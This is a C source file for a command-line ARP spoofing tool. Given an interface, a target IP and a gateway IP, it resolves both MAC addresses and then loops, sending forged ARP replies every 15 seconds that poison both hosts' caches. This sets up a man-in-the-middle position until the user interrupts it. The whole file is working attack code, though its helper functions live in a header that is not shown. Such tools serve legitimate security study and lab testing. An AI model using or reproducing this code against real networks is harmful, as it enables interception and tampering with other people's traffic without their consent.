#include "headers/utils.h"
#include <signal.h>

volatile sig_atomic_t keep_running = 1;

void sigint_handler(int sig)
{
    (void)sig;
    keep_running = 0;
}
void exit_protocol(int *fd, struct if_nameindex *ifr)
{
    if (fd && *fd >= 0) {
        close(*fd);
    }
    if (ifr) {
        if (ifr->if_name) {
            free(ifr->if_name);
        }
        free(ifr);
    }
    printf("Safely exited\n");
}
int main(int argc, const char **argv)
{
    if (argc != 4) {
        printf("Usage: %s <INTERFACE> <TARGET_IP> <GATEWAY_IP>\n", argv[0]);
        printf("example: %s wlp4s0 192.168.1.4 192.168.1.1\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    uint8_t target_mac_addr[ETH_ADDR_LENGTH];
    uint8_t gateway_mac_addr[ETH_ADDR_LENGTH];
    uint32_t target_ip, gateway_ip;
    if (convert_ipv4_addr(argv[2], &target_ip) < 0) {
        perror("convert_ipv4_addr()");
        exit(EXIT_FAILURE);
    }
    if (convert_ipv4_addr(argv[3], &gateway_ip) < 0) {
        perror("convert_ipv4_addr()");
        exit(EXIT_FAILURE);
    }

    info("ARP spoofing initiated...");
    int arp_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_TYPE_ARP));
    if (arp_fd < 0) {
        perror("socket()");
        exit(EXIT_FAILURE);
    }

    struct if_nameindex *ifr = malloc(sizeof(struct if_nameindex));
    if (!ifr) {
        perror("Memory allocation for if_nameindex failed");
        exit_protocol(&arp_fd, NULL);
        exit(EXIT_FAILURE);
    }
    ifr->if_name = malloc(IF_NAMESIZE);
    if (!ifr->if_name) {
        perror("Memory allocation for if_name failed");
        exit_protocol(&arp_fd, ifr);
        exit(EXIT_FAILURE);
    }
    strncpy(ifr->if_name, argv[1], IF_NAMESIZE);
    ifr->if_index = if_nametoindex(ifr->if_name);

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(struct sockaddr_ll));
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_TYPE_ARP);
    sll.sll_ifindex = ifr->if_index;

    if (bind(arp_fd, (struct sockaddr *) &sll, sizeof(sll)) < 0) {
        perror("bind()");
        exit_protocol(&arp_fd, ifr);
        exit(EXIT_FAILURE);
    }

    // get localhost info
    uint8_t src_mac_addr[ETH_ADDR_LENGTH];
    uint32_t src_ip;
    if (get_if_info(ifr, src_mac_addr, &src_ip) < 0) {
        perror("get_if_info()");
        exit_protocol(&arp_fd, ifr);
        exit(EXIT_FAILURE);
    }

    info("Waiting for ARP replies to get MAC addresses...");
    info("Do not exit the program yet...");
    if (get_mac_addr(arp_fd, ifr, target_ip, target_mac_addr) < 0) {
        perror("get_mac_addr()");
        exit_protocol(&arp_fd, ifr);
        exit(EXIT_FAILURE);
    }
    if (get_mac_addr(arp_fd, ifr, gateway_ip, gateway_mac_addr) < 0) {
        perror("get_mac_addr()");
        exit_protocol(&arp_fd, ifr);
        exit(EXIT_FAILURE);
    }
    printf("Target MAC address: ");
    print_mac_addr(target_mac_addr);
    printf("Gateway MAC address: ");
    print_mac_addr(gateway_mac_addr);

    // register the SIGINT handler
    signal(SIGINT, sigint_handler);
    info("Sending ARP reply packets...");
    info("Press CTRL+C to quit.");

    while (keep_running) {
        if (send_arp_pkt(arp_fd, ifr->if_index, PACKET_OTHERHOST,
        ARP_REPLY, src_mac_addr, &gateway_ip, target_mac_addr, &target_ip) < 0) {
            perror("send_arp_packet()");
            exit_protocol(&arp_fd, ifr);
            exit(EXIT_FAILURE);
        }
        if (send_arp_pkt(arp_fd, ifr->if_index, PACKET_OTHERHOST,
        ARP_REPLY, src_mac_addr, &target_ip, gateway_mac_addr, &gateway_ip) < 0) {
            perror("send_arp_packet()");
            exit_protocol(&arp_fd, ifr);
            exit(EXIT_FAILURE);
        }
        sleep(15);
    }
    info("\nGracefully exiting the program...");
    exit_protocol(&arp_fd, ifr);
    return 0;
}